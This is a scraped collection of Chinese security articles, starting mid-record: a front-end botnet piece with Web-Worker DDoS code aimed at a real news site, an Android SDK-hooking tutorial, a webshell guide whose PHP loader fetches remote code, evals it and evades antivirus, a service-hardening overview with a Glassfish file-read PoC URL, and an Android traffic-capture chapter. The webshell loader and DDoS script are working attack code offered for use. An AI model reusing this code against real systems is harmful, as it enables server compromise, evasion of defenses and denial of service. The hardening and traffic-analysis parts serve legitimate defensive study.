request)是指浏览器向提供第一个资源不同域名发起的请求。CORS机制可以让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。很多文章和资料对CORS机制内部工作原理解释的不够清楚，导致本人一度以为CORS是在跨域请求发出时拦截或者在服务器层次禁止了资源的返回。然而实际上CORS安全机制并没有针对服务器提供任何保护。本文只针对XMLHttpRequest总结以下几点：1.XMLHttpRequest请求可以发送到跨域服务器；2.跨域服务器会对之前的XMLHttpRequest做出响应；3.跨域服务器对XMLHttpRequest的响应和正常访问这个服务器产生的响应没有任何区别；4.未能加载服务器资源的原因是浏览器对跨域资源做出了拦截限制。因此，对于服务器来说，假设有10000个XMLHttpRequest同时对某资源发出请求，以上的请求与10000个用户同时用浏览器正常访问这个资源是等价的，因为都是做同样的处理，都是返回同样的内容。这也就是说，使用Web Worker和XMLHttpRequest进行DDOS攻击是可行的。Web蠕虫Web蠕虫是Web前端僵尸自行传播的方法。这种机制利用的是传统前端漏洞，例如XSS漏洞。本文没有尝试实现僵尸节点（Web前端）和控制端的交互，这需要更复杂的JS代码，顺便提一下已经实现此类功能的BeEF XSS框架。这个框架很流行，集成了很多功能，甚至能够结合MSF使用。但是这些不在本文的探究范围之内。本文只对这个框架控制端和僵尸节点的交互进行演示。Kali Linux系统中集成了这个工具，本文用Kali Linux虚拟机进行演示。打开BeEF框架之后如图所示，不要关闭这个终端，等待程序加载完成后，一般情况下浏览器会弹出，如果没有弹出，打开浏览器手动输入终端中显示的UI URL。 默认的用户名和密码都是beef。登录成功后的页面如下：首页上有一些被植入恶意Javascript的Demo。为了演示的方便，使用实体机的Safari浏览器进行访问，将会在左侧显示信息。接下来按照下图点击到如下页面。点击红色圆圈中的Execute之后，将会在用户浏览器执行上面方框中输入的Javascript代码，给用户的浏览器弹出一个对话框，下图是实体机的Safari浏览器中的效果：通过这种方式，就可以在用户的浏览器中执行控制端需要僵尸节点执行的代码。有兴趣的朋友可以去读一下BeEF框架中hook.js文件源代码，应该会有很多启发。僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）测试的思路是：植入恶意Javascript代码，批量对某网站发送100次XMLHttpRequest，此次尝试的对象是腾讯的网站，因为单个节点的100次请求肯定对腾讯服务器无影响。攻击url为：http://news.qq.com/photo.shtml，用户访问的url为：http://localhost/botnet/index.html，测试代码见附录。通过Wireshark和chrome浏览器network开发者工具对测试结果进行分析：Wireshark抓到的tcp流：详细查看Response：Chrome：可以看到，Wireshark抓到了Response是有资源数据的，但是Chrome中得到的只有服务器返回的状态信息，这是CORS机制在浏览器层次对于跨域资源做了限制。但是，Wireshark抓包得到的数据可以证明服务器实实在在地对每个请求都做出了正常的响应。当这样的僵尸节点数目和Web Worker并发数目都增大到一定的等级，理论上就可以形成强大的DDOS攻击了。总结HTML5时代的Web前端已经不再那么简单。支持HTML5的浏览器，给了僵尸网络足够的生存空间。附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）run_worker.js:var worker_loc= 'worker.js';var workers = new Array();var i = 0;var noWorker = typeof Worker ==""undefined"" ? true : false;var target = 'http://news.qq.com/photo.shtml'if (!noWorker) {try {for(i = 0; i &lt; 1; i++) {workers[i] = new Worker(worker_loc);workers[i].postMessage(target);}}catch(e) {//comment out in releasee = e + """";if(e.indexOf(""Worker is not enabled"") != -1) {noWorker = true;}}} 当浏览器支持Web Worker的时候，就会根据代码循环建立Worker。利用new worker(worker_loc)方式，创建Worker对象，并利用Worker的postMessage方法向worker发送指令等数据。多个Worker可以实现并发。但是本例只建立了一个Worker。worker.js:function makeRequest(base) {varfullUrl = basevarhttpRequest = new XMLHttpRequest();httpRequest.open(""GET"", fullUrl, true);httpRequest.send(null);}function dos(base) {var i =0;for (i= 0; i &lt; 100; i++) {console.log(base);makeRequest(base);}}self.onmessage = function (e) {base =e.data;dos(base);}Web Worker可以使用XMLHttpRequest发送跨域请求。这个函数可以使用GET和POST两种方法，一般使用GET方法就可以了，但是POST方法不限制发送长度和字符，有些情况必须要用POST方法。本例中采用GET方法测试。index.html:&lt;style&gt;#page{width: 100%; height: 100%;}body{margin:0}&lt;/style&gt;&lt;script type=""text/javascript""&gt;varworker_loc = 'worker.js';&lt;/script&gt;&lt;script type=""text/javascript""src=""run_worker.js""&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe id=""page""name=""page"" src=""http://www.example.com"" frameborder=""0""noresize=""noresize""style=""overflow:visible""&gt;&lt;/iframe&gt;&lt;/body&gt;index.html几乎没有更改，因为这个网页的内容对恶意Javascript的测试没有影响。","2016-11-29 12:58:41","网络安全","浅谈Web前端僵尸网络","http://nsoad.com/Article/Network-security/20161129/864.html"
"5ccbf9cb4f2f0a0a7a69bfc5","有时候我们在Android开发过程中可能有这样的需求：需要研究或者修改工程依赖的Jar包中的一些逻辑，查看代码运行中Jar包代码内部的取值情况（比如了解SDK与其服务器通信的请求报文加密前的情况）。","风云信步","前言有时候我们在Android开发过程中可能有这样的需求：需要研究或者修改工程依赖的Jar包中的一些逻辑，查看代码运行中Jar包代码内部的取值情况（比如了解SDK与其服务器通信的请求报文加密前的情况）。这个需求类似于Hook。但是往往这些依赖的Jar包中的代码已经被混淆过，删去了本地变量表和代码行号等debug信息，所以无法直接断点调试，其内部逻辑和运行情况也几乎无法触及，研究更难以下手。这时候，一般的办法有二：1.将Jar反解为Java源码，以module方式引入，便可自由修改调试；2.修改字节码或者打包后的smali代码，实现想要的逻辑后再重新打包。这两种方法中，前者往往十分繁杂，尤其在混淆后逻辑变得极其复杂，几乎不可能完成；后者也很麻烦，工序较多，修改成本也比较高。插件：HiBeaverAndroid gradle编译插件hibeaver结合Java AOP编程中对于大名鼎鼎的ASM.jar的应用，和Android gradle 插件提供的最新的Transform API，在Apk编译环节中、class打包成dex之前，插入了中间环节，依据开发者的配置调用ASM API对项目所依赖的jar进行相应的修改，从而可以比较高效地实现上面的Hook需求。 源码地址：https://github.com/BryanSharp/hibeaver唯一需要注意的是，运用好这个插件需要有一定的Java汇编指令基础，并了解基本的ASM3的使用方法：后者还是很简单的，而前者，关于Java汇编指令基础这块，对于事先不了解的同学，接触起来有一定难度，但是学一学这个其实非常有益处，对于理解Java的运行有很大的帮助。 闲话少说，先看看如何快速实践一把！关键看疗效！实战演练我们就先来尝试用这个Hook掉小米推送的SDK。首先，在需要的工程的根项目gradle配置中加入以下内容：如图所示，该插件上传到了jcenter中，只需引入classpath：classpath 'com.bryansharp:HiBeaver:1.2.2'这里需要注意的是，目前该插件仅支持Android gradle编译插件2.0及以上的版本。 然后，在你的App项目gradle配置底部或任意位置加入如下代码：apply plugin: 'hiBeaver'  hiBeaver {      //turn this on to make it print help content, default value is true    showHelp = true    //this flag will decide whether the log of the modifying process be printed or not, default value is false    keepQuiet = false    //this is a kit feature of the plugin, set it true to see the time consume of this build    watchTimeConsume = false    //this is the most important part    modifyMatchMaps = [:]}然后，重新编译一下项目，会先去jitpack下载这个插件，开始编译后可以看到Android Studio的右下角的Gradle Console中，多输出了以下内容：如果你看到了和我一样的内容，那说明初步配置成功。 可以看到，使用插件后会输出一段友好的帮助内容，还是中英文的，告诉我们可以直接拷贝作为初始配置，这个帮助输出也是可以关闭的。 下面我们正式开始尝试Hook小米推送SDK，首先，找出其业务逻辑中的一个节点。 首先，引入小米推送，这个过程不赘述了，blablabla，引入成功！ 众所周知，使用小米推送需要先在代码中调用如下：MiPushClient.registerPush(this, APP_ID, APP_KEY); 这个代码应该会调起本地长连接的建立、注册服务器等流程。假如我们出于学习的目的，想研究其中的流程，试举一例，先从查看其反编译的代码开始，找一个切入的节点，如下： 首先进入查看MiPushClient.registerPush这个方法:在initialize的方法中，找到一段逻辑如下：进入a方法，来到了这个类：com.xiaomi.mipush.sdk.u中，发现：下面如果我们想看看运行时前两个方法传入参数的值，就可以开始Hook了。该如何做呢？这个方法体内打Log输出所有的值吗？那样太麻烦了。我们可以这样做： 首先在我们项目的源码里新建一个静态方法，包含两个参数，如下图：其后，我们只要在a方法中加入一段代码，调用我们的静态方法，并传入我们想查看的两个参数即可。 这就有赖于我们的hibeaver插件了，具体如何做呢？我们可以先看看之前的帮助内容：里面有提到一个the most important par，最重要的部分。没错，这个插件的核心就在于配置这个类型为Map&gt;&gt;的传入量。 首先我们配置如下：然后重新编译，发现输出log如下：这样就输出这个u类的所有方法信息，用于后面进行配置。 再来看看刚刚的方法a：是一个泛型方法，众所周知泛型只存在于编码阶段，编译后是没有泛型的，其实传入的参数的实际类型为org.apache.thrift.a，最终找到其方法描述应该为：(Lorg/apache/thrift/a;Lcom/xiaomi/xmpush/thrift/a;ZLcom/xiaomi/xmpush/thrift/r;)V进一步配置：然后重新编译，console输出新增revist部分，如下：最后，我们增加如下代码，在其中植入我们的代码，调用刚刚的静态方法，并把对应值传递过来： 终极配置：以上代码就不做详细解释了，相信有基础的都能明白，然后编译查看输出:下面我们debug一下，看看是否可以成功在registerPush的运行流程中调用到我们的方法：上面可以看到，无论是debug还是log输出都可以抓到想要的参数了。 因为小米推送是商业产品，这里不便于探索太多内容，但是通过hibeaver这个插件可以比较方便的进行类似的研究。总结hibeaver所体现的技术，并没有特别大的价值，仅仅作为工具来讲比较方便易用，有助于学习研究Jar中的逻辑，和学习应用Java汇编码。除此之外，还有几个应用场景：1.修改引用SDK中的一些bug或者提高其效率；2.获得必要的SDK的一些关键调用时机，通过hook建立回调；3.欺骗SDK、关闭或减少SDK中不受控制的网络传输。不一而足，还是很有趣、很有想象空间的。 目前存在的问题，如下，这个除了偶尔同步报错之外没有影响，编译正常：还有，如果仅仅修改了gradle文件，不会触发更新，需要在代码上也进行任意修改方生效。关于项目hibeaver完全开源，大家可以自行查看其中代码，有大量的中文注释，对于学习gradle插件开发大有裨益。 github开源项目地址：https://github.com/BryanSharp/hibeaver","2017-02-28 15:55:36","移动安全","Android字节码修改神器HiBeaver：黑掉你的SDK","http://nsoad.com/Article/MobileSecurity/20170228/1090.html"
"5ccbf9cb4f2f0a0a7a69bfc6","在之前sky666提到了关于大马被waf拦的问题，我决定手动去过一下bypass。可是发现怎么也过不去查杀，更别说拦截了。对此无奈，只好花了个通宵去处理一下。顺便一提，理论过所有Waf，并且被杀只需要稍微处理","X_Al3r","在之前sky666提到了关于大马被waf拦的问题，我决定手动去过一下bypass。可是发现怎么也过不去查杀，更别说拦截了。对此无奈，只好花了个通宵去处理一下。顺便一提，理论过所有Waf，并且被杀只需要稍微处理一下依旧可用。Prat 1 目录一：base64编码，处理eval函数进行绕过(失败)二：巧妙利用fopen函数绕过waf三：fopen函数处理eval拦截问题四：对此次一次总结Prat 2 起源base64编码，处理eval函数进行绕过(失败)之前一份大马中，发现进行base64编码过后，查杀的是已知后门，而不是查杀某个函数，于是决定开端先处理一下eval看看能不能进行绕过eval直接执行base64解码可以成功执行，但是被D盾报4级，这样肯定是不行的base64编码思路宣告失败发现D盾似乎对base64_decode()函数独有情钟- -#不管怎么处理只能处理到二级，安全狗倒是已经过去了&lt;?php$a = 'base64编码过后';$c = base64_decode($a);eval($d = $c);?&gt;Prat 3 失落巧妙利用fopen函数绕过waf发现base64思路惨败D盾过后，抽了支烟，说了一句D盾你个禽兽不过失败是成功他亲爹，只好继续想新思路。之前写过一篇水文，叫做隐藏在黑页下的大马。不过被挺多人喷的，其实这篇文章只是另外一种思路的铺垫，不过因为没人支持，也就没有写下去了。这篇文章中用了php_curl函数，不过利用门槛比较高，于是查了一下等价函数。首先我们来看一下fopen函数fopen() //fopen()函数打开文件或者 URL。思路通过fopen打开远程url的txt文件存入一个变量中，在执行。说干就干，首先把一份大马去掉&lt;?以及?&gt;然后存入一个txt中，确保打开的时候能打开。可能这里就有人问了，txt放哪里?这里我只想说，心里没点B数?大马地址：http://127.0.0.1/bh/test.txt举个例子：&lt;?php $handle1 = fopen('http://127.0.0.1/bh/test.txt', 'r');$content1 = '';                while(false != ($a1 = fread($handle1, 8080))){                        $content1 .= $a1;                        }                        echo $content1;                fclose($handle1);?&gt;发现已经获取成功了，那么我们只需要eval执行一下就可以了&lt;?php $handle1 = fopen('http://127.0.0.1/bh/test.txt', 'r');$content1 = '';                while(false != ($a1 = fread($handle1, 8080))){                        $content1 .= $a1;                        }                        eval($content1);                fclose($handle1);?&gt;首先看一下安全狗是否拦截大马地址：http://192.168.1.110/bh/test.txtwebshell地址：192.168.1.104/test/php.phpok,可以看见安全狗以及绕过了，并且可以正常使用补一张没做过处理大马访问图不过问题来了，D盾报一级拦截，我顿时想说mmp。之前处理一句话的时候，也是经常报我一级- -#继续抽了支烟，然后继续处理这个错误Prat 4 希望fopen函数处理eval拦截问题这里没什么思路完全是因为bypass小分队的大佬帮我处理的。贴一下最后成品代码&lt;?phperror_reporting(E_ERROR);if(isset(isset($_GET['submit']) &amp;&amp; $_GET['pass'] == ""admin""){        if($_POST[$_GET['test'] == ""test""){                $handle1 = fopen('http://127.0.0.1/bh/test2.txt', 'r');                $content1 = '';                while(false != ($a1 = fread($handle1, 8080))){                        $content1 .= $a1;                        }                        print(eval($a1=$content1));                fclose($handle1);        }        $handle = fopen('http://127.0.0.1/bh/test.txt', 'r');    $content = '';    while(false != ($a = fread($handle, 8080))){        $content .= $a;    }                print(eval($a=$content));fclose($handle);}?&gt;一句话地址：http://127.0.0.1/bh/test2.txtwebshell地址：http://127.0.0.1/bh/test.txt说一下代码if(isset($_GET['submit']) &amp;&amp; $_GET['pass'] == ""admin"")这一部分是验证部分，但是懒得写好看的登陆口，直接获取了下GET传值做判断，为了防爆破多写了一个if($_POST[$_GET['test'] == ""test"")这一部分是用来进入一句话的，当然你也可以删掉再来说说处理eval一级，其实很简单，我也是bypass小分队的老司机说了才知道的~~~eval($a1=$content1);看这一行代码，相信大家就已经知道了。Prat 5 总结前人失效的思路不代表着没有继续扩展的意义。多想多做多实战，发现其实waf也就那回事。无非就是在原有的基础上加了几行代码。","2017-10-27 16:04:30","Web安全","打造一款1kb大马并且处理D盾以及安全狗拦截与查杀","http://nsoad.com/Article/web/20171027/1177.html"
"5ccbf9cb4f2f0a0a7a69bfc7","12月份要要给公司同学做安全技术分享，有一块是讲常见服务的漏洞，网上的漏洞检测和修复方案写都比较散，在这里一起做一个整合，整理部分常见服务最近的漏洞和使用上的安全隐患方便有需要的朋友查看。","kong","前言12月份要要给公司同学做安全技术分享，有一块是讲常见服务的漏洞，网上的漏洞检测和修复方案写都比较散，在这里一起做一个整合，整理部分常见服务最近的漏洞和使用上的安全隐患方便有需要的朋友查看。如文章有笔误的地方请与我联系 WeChat:atiger77目录1.内核级别漏洞Dirty COW2.应用程序漏洞NginxTomcatGlassfishGitlabMysqlStruts2ImageMagick...3.应用安全隐患SSHRedisJenkinsZookeeperZabbix   ElasticsearchDocker...4.总结漏洞检测&amp;修复方法1.内核级别漏洞Dirty COW脏牛漏洞，Linux 内核内存子系统的 COW 机制在处理内存写入时存在竞争，导致只读内存页可能被篡改。影响范围：Linux kernel &gt;= 2.6.22漏洞影响：低权限用户可以利用该漏洞写入对自身只读的内存页（包括可写文件系统上对该用户只读的文件）并提权至 rootPoC参考：https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs漏洞详情&amp;修复参考：http://sanwen8.cn/p/53d08S6.htmlhttp://www.freebuf.com/vuls/117331.html这个漏洞对于使用linux系统的公司来说是一定要修复的，拿web服务举例，我们使用一个低权限用户开放web服务当web被攻击者挂了shell就可以使用exp直接提权到root用户。目前某些云厂商已经在基础镜像中修复了这个问题但是对于之前已创建的主机需要手动修复，具体修复方案可以参考长亭的文章。2.应用程序漏洞NginxNginx是企业中出现频率最高的服务之一，常用于web或者反代功能。11月15日，国外安全研究员Dawid Golunski公开了一个新的Nginx漏洞（CVE-2016-1247），能够影响基于Debian系列的发行版。影响范围：Debian: Nginx1.6.2-5+deb8u3Ubuntu 16.04: Nginx1.10.0-0ubuntu0.16.04.3Ubuntu 14.04: Nginx1.4.6-1ubuntu3.6Ubuntu 16.10: Nginx1.10.1-0ubuntu1.1漏洞详情&amp;修复参考：https://www.seebug.org/vuldb/ssvid-92538这个漏洞需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。对于企业来说如果nginx部署在Ubuntu或者Debian上需要查看发行版本是否存在问题即使打上补丁即可，对于RedHat类的发行版则不需要任何修复。TomcatTomcat于10月1日曝出本地提权漏洞CVE-2016-1240。仅需Tomcat用户低权限，攻击者就能利用该漏洞获取到系统的ROOT权限。影响范围：Tomcat 8 &lt;= 8.0.36-2Tomcat 7 &lt;= 7.0.70-2Tomcat 6 &lt;= 6.0.45+dfsg-1~deb8u1受影响的系统包括Debian、Ubuntu，其他使用相应deb包的系统也可能受到影响漏洞详情&amp;修复参考：http://www.freebuf.com/vuls/115862.htmlCVE-2016-4438这一漏洞其问题出在Tomcat的deb包中,使 deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tocat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。实现这个漏洞必须要重启tomcat服务，作为企业做好服务器登录的权限控制，升级有风险的服务可避免问题。当然在企业中存在不少部署问题而导致了Tomcat存在安全隐患，运维部署完环境后交付给开发同学，如果没有删除Tomcat默认的文件夹就开放到了公网，攻击者可以通过部署WAR包的方式来获取机器权限。GlassfishGlassfish是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。低版本存在任何文件读取漏洞。影响范围：Glassfish4.0至4.1修复参考：升级至4.11或以上版本PoC参考：http://1.2.3.4:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile因为公司有用到Glassfish服务，当时在乌云上看到PoC也测试了下4.0的确存在任何文件读取问题，修复方法也是升级到4.11及以上版本。GitlabGitlab是一个用于仓库管理系统的开源项目。含义使用Git作为代码管理工具，越来越多的公司从SVN逐步移到Gitlab上来，由于存放着公司代码，数据安全也变得格外重要。影响范围：任意文件读取漏洞(CVE-2016-9086): GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13任意用户authentication_token泄露漏洞： Gitlab CE/EE versions 8.10.3-8.10.5漏洞详情&amp;修复参考：http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/互联网上有不少公司的代码仓库公网可直接访问，有些是历史原因有些是没有考虑到安全隐患，对于已经部署在公网的情况，可以让Gitlab强制开启二次认证防止暴力破解这里建议使用Google的身份验证，修改默认访问端口，做好acl只允许指定IP进行访问。MysqlMysql是常见的关系型数据库之一，翻了下最新的漏洞情况有CVE-2016-6662和一个Mysql代码执行漏洞。由于这两个漏洞实现均需要获取到服务器权限，这里就不展开介绍漏洞有兴趣的可以看下相关文章，主要讲一下Mysql安全加固。漏洞详情&amp;修复参考：http://bobao.360.cn/learning/detail/3026.htmlhttp://bobao.360.cn/learning/detail/3025.html在互联网企业中Mysql是很常见的服务，我这边提几点Mysql的安全加固，首先对于某些高级别的后台比如运营，用户等能涉及到用户信息的可以做蜜罐表。在项目申请资源的时候就要做好权限的划分，我们是运维同学保留最高权限，给开发一个只读用户和一个开发权限的用户进行使用，密码一律32位，同时指定机器登录数据库，删除默认数据库和数据库用户。找了一篇还不错的加固文章提供参考：http://www.it165.net/database/html/201210/3132.htmlStruts2Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。漏洞详情&amp;修复参考：http://blog.nsfocus.net/apache-struts2-vulnerability-technical-analysis-protection-scheme-s2-033/http://blog.nsfocus.net/apache-struts2-vulnerability-technical-analysis-protection-scheme-s2-037/在线检测平台：http://0day.websaas.com.cn/记得有一段时间Struts2的漏洞连续被爆出，自动化的工具也越来越多S2-032，S2-033,S2-037,乌云首页上都是Struts2的漏洞，有国企行业的有证券公司的使用者都分分中招，如果有使用的话还是建议升级到最新稳定版。ImageMagickImageMagick是一个图象处理软件。它可以编辑、显示包括JPEG、TIFF、PNM、PNG、GIF和Photo CD在内的绝大多数当今最流行的图象格式。影响范围：ImageMagick 6.5.7-8 2012-08-17ImageMagick 6.7.7-10 2014-03-06低版本至6.9.3-9released 2016-04-30漏洞详情&amp;修复参考：http://www.freebuf.com/vuls/104048.htmlhttp://www.ithome.com/html/it/223125.htm这个漏洞爆出来时也是被刷屏的，各大互联网公司都纷纷中招，利用一张构造的图片使用管道服符让其执行反弹shell拿到服务器权限，产生原因是因为字符过滤不严谨所导致的执行代码.对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。3.应用安全隐患为了不加长篇幅长度，加固具体步骤可以自行搜索。SSH之前有人做过实验把一台刚初始化好的机器放公网上看多久会遭受到攻击，结果半个小时就有IP开始爆破SSH的密码，网上通过SSH弱密码进服务器的案列也比比皆是。安全隐患：弱密码加固建议： 禁止使用密码登录，更改为使用KEY登录 禁止root用户登录，通过普通权限通过连接后sudo到root用户 修改默认端口（默认端口为22）RedisRedis默认是没有密码的，在不需要密码访问的情况下是非常危险的一件事，攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。安全隐患：未认证访问开放公网访问加固建议： 禁止把Redis直接暴露在公网 添加认证，访问服务必须使用密码JenkinsJenkins在公司中出现的频率也特别频繁，从集成测试到自动部署都可以使用Jenkins来完成，默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者通过暴力破解用户密码进脚本执行界面从而获取服务器权限。安全隐患：登录未设置密码或密码过于简单开放公网访问加固建议： 禁止把Jenkins直接暴露在公网 添加认证，建议使用用户矩阵或者与JIRA打通，JIRA设置密码复杂度Zookeeper分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。Zookeeper默认也是未授权就可以访问了，特别对于公网开放的Zookeeper来说，这也导致了信息泄露的存在。安全隐患：开放公网访问未认证访问加固建议： 禁止把Zookeeper直接暴露在公网 添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）ZabbixZabbix为运维使用的监控系统，可以对服务器各项指标做出监控报警，默认有一个不需要密码访问的用户（Guest）。可以通过手工SQL注入获取管理员用户名和密码甚至拿到session，一旦攻击者获取Zabbix登录权限，那么后果不堪设想。安全隐患：开放公网访问未删除默认用户弱密码加固建议： 禁止把Zabbix直接暴露在公网 删除默认用户 加强密码复杂度ElasticsearchElasticsearch是一个基于Lucene的搜索服务器。越来越多的公司使用ELK作为日志分析，Elasticsearch在低版本中存在漏洞可命令执行，通常安装后大家都会安装elasticsearch-head方便管理索引，由于默认是没有访问控制导致会出现安全隐患。安全隐患：开放公网访问未认证访问低版本漏洞加固建议： 禁止把Zabbix直接暴露在公网 删除默认用户 升级至最新稳定版 安装Shield安全插件Docker容器服务在互联网公司中出现的频率呈直线上升，越来越多的公司使用容器去代替原先的虚拟化技术，之前专门做过Docker安全的分析，从 Docker自身安全， DockerImages安全和Docker使用安全隐患进行展开，链接：https://toutiao.io/posts/2y9xx8/preview之前看到一个外国哥们使用脏牛漏洞在容器中运行EXP跳出容器的视频，具体我还没有复现，如果有复现出来的大家一起交流下~安全隐患：Base镜像漏洞部署配置不当加固建议：手动升级Base镜像打上对应补丁配置Swarm要当心4.总结当公司没有负责安全的同学，做到以下几点可以在一定程度上做到防护：关注最新漏洞情况，选择性的进行修复；梳理内部开放服务，了解哪些对外开放能内网访问的绝不开放公网；开放公网的服务必须做好访问控制；避免弱密码；避免弱密码；避免弱密码；以上内容只是理想状态，实际情况即使有安全部门以上内容也不一定能全部做到，业务的快速迭代，开发安全意识的各不相同，跨部门沟通上出现问题等等都会导致出现问题，这篇文章只罗列了部分服务，还有很多服务也有同样的问题，我有空会不断的更新。 WeChat:atiger77","2016-11-29 12:13:36","网络安全","企业常见服务漏洞检测&修复整理","http://nsoad.com/Article/Network-security/20161129/858.html"
"5ccbf9cb4f2f0a0a7a69bfc8","在本章中，我们将研究 Android 设备的网络流量，并分析平台和应用程序的流量数据。 通常应用程序会在其网络数据中泄漏敏感信息，因此发现它是渗透测试程序最重要的任务之一。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在本章中，我们将研究 Android 设备的网络流量，并分析平台和应用程序的流量数据。 通常应用程序会在其网络数据中泄漏敏感信息，因此发现它是渗透测试程序最重要的任务之一。此外，你经常会遇到通过不安全的网络协议执行身份验证和会话管理的应用程序。 因此，在本章中，我们将学习如何拦截和分析 Android 设备中，各种应用程序的流量。4.1  Android  流 量 拦 截根据 OWASP 移动Top10（https://www.owasp.org/index.php/Project/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks） ，不完善的传输层保护是第三大威胁。实际上，假设一个应用程序通过 HTTP 将用户的登录凭据提交到服务器。 如果用户位于咖啡店或机场，并在有人嗅探网络时登录到他的应用程序，会怎么样？ 攻击者能够获得特定用户的整个登录凭据，它以后可能用于恶意目的。 假设应用程序正在通过 HTTPS 进行身份验证，通过 HTTP 的会话管理，并且在请求中传递身份验证 Cookie。 在这种情况下，攻击者也能够通过在执行中间人攻击时拦截网络来获取身份验证 Cookie。 使用这些认证 cookie，他可以直接作为受害用户登录到应用程序。4.2  流 量 分 析 方 式在任何情况下都有两种不同的流量捕获和分析方法。 我们将研究 Android 环境中可能的两种不同类型，以及如何在真实场景中执行它们。 被动和主动分析如下：被动分析：这是一种流量分析的方法，其中应用程序发送的网络数据不会被拦截。 相反，我们将尝试捕获所有网络数据包，然后在网络分析器（ 如Wireshark） 中打开它，然后尝试找出应用程序中的漏洞或安全问题。主动分析：在主动分析中，渗透测试者将主动拦截所有正在进行的网络通信，并可以即时分析，评估和修改数据。 这里，他需要设置代理，并且由应用/设备生成和接收的所有网络流量会通过该代理。被 动 分 析被动分析的概念是将所有网络信息保存到特定文件中，之后使用数据包分析器查看。 这就是我们将在 Android 设备中进行被动分析。 我们将使用 tcpdump 来将所有的信息保存到设备中一个位置。 此后，我们将该文件拉取到我们的系统，然后使用 Wireshark 或 Cocoa 包分析器查看它。 请参阅以下步骤：我们从 Timur Alperovich 的网站 http://www.eecs.umich.edu/~timuralp/tcpdump-arm 下载为 ARM 编译的 tcpdump 二进制文件。 如果我们需要，我们还可以下载 tcpdump 的原始二进制文件并交叉编译（ 为 Android 交叉编译你的二进制文件，请按照链接http://machi021.blogspot.jp/2011/03/compile-busybox-for-android.html 。链接展示了交叉编译 BusyBox，但相同的步骤可以应用于 tcpdump ） 。一旦我们下载了 tcpdump ，我们可以通过在我们刚刚下载的二进制上执行一个文件，来确认它是否为 ARM 编译。对于 Windows 用户，你可以使用 Cygwin 来执行命令。 输出类似于以下屏幕截图中所示：这里的下一步是将 tcpdump 二进制文件推送到设备中的一个位置。 我们还必须记住，我们需要继续执行这个文件。 因此，我们将它推送到一个位置，我们可以从中更改权限，以及执行二进制来捕获流量。现在，继续并使用 adb 的 push 命令推送二进制来将二进制推送到设备。 同样，在我们需要从设备中拉取内容的情况下，我们可以使用 pull 而不是 push。这里，我们将使用 adb push 将其推送到 Android 中的 /data/local/tmp ：adb push tcpdump-arm /data/local/tmp/tcpdum一旦我们将 tcpdump 二进制推送到设备，然后需要使用 adb 在 shell 中访问设备，并更改二进制的权限。 如果我们试图运行 tcpdump ，它会给我们一个权限错误，因为我们没有执行权限。为了更改权限，我们需要访问 /data/local/tmp ，使用 chmod 命令，并授予其权限 777 ，这意味着应用程序将具有所有权限。 以下屏幕截图显示了上述命令的结果输出：这里的最后一步是启动 tcpdump 并将输出写入 .pcap 文件。 使用 -s ， -v 和 -w 标志启动 tcpdump 。 参考以下描述：-s：这表示从每个封包抽取给定（ 在我们的例子中为 0） 字节的数据，而不是默认的65535 字节。-v：这表明详细输出。-w：这表明写入原始数据包的文件名。 例如，我们可以使用 ./tcpdump-v-s 0 -w output.pcap ，以便将所有文件写入 output.pcap ，并输出详细信息。在流量捕获执行期间，打开手机浏览器并访问位于 http://attify.com/data/login.html 的漏洞登录表单，该表单通过 HTTP 发送所有数据并使用 GET 请求：这里使用用户名 android 和密码 mysecretpassword 登录应用程序。我们现在可以在任何时候通过 adb shell 服务终止进程（ 使用 Ctrl + C ） 。 下一步是将捕获的信息从设备拉取到我们的系统。 为此，我们将简单地使用 adb pull 如下：adb pull /data/local/tmp/output.pcap output.pcap你可能还需要更改 output.pcap 的权限才能拉取它。 在这种情况下，只需执行以下命令：chmod 666 output.pcap一旦我们下载了捕获的网络数据的.pcap文件，我们可以在 Wireshark 中打开它并分析流量。 在这里，我们将尝试查找捕获的登录请求。 我们可以从网站 http://www.wireshark.org/download.html 下载 Wireshark。 一旦下载并安装完毕，打开 Wireshark 并在里面打开我们新拉取的文件 output.pcap ，通过访问 File | Open 。一旦我们在 Wireshark 中打开 .pcap 文件，我们会注意到一个类似下面截图所示的屏幕：Wireshark 是一个开源封包分析器，它帮助我们发现敏感信息，并分析来自所有网络连接的流量数据。 在这里，我们正在搜索我们对 http://attify.com 所做的请求，并输入了我们的登录凭据。现在，访问 Edit 并单击 Find Packets 。 在这里，我们需要查找我们提交登录凭据的网站，并检查 String 。在这里，我们可以看到与 http://attify.com/data/login.html 的连接。 如果我们在底部窗格中查找有关此数据包的更多信息，我们可以看到包含我们输入的用户名和密码的请求网址。因此，我们使用 tcpdump 成功捕获了网络数据，并将其存储在 .pcap 文件中，然后使用Wireshark 进行分析。 然而，被动流量捕获也可以通过 adb shell 直接完成。adb shell /data/local/tmp/tcpdump -i any -p -s 0 -w /mnt/sdcar/output.pcap这里， -i 代表接口。 